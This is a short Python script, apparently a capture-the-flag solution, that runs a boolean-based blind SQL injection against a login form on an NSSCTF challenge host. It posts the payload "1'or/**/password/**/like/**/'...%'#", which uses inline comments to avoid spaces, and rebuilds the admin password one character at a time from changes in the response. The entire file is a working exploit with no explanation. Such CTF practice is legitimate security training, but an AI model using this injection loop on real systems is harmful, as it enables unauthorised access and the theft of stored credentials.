import time

import requests

url = "http://node4.anna.nssctf.cn:22868/"
flag = ''
zifu="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~"
print(zifu)
while True:
    for i in zifu:
        data={
            "username": "admin",
            "password": f"1'or/**/password/**/like/**/'{flag+i}%'#"
        }
        res = requests.post(url=url,data=data)
        time.sleep(0.1)
        if "something wrong" not in res.text:
            flag+=i
            print(flag)
            break
        else:
            pass
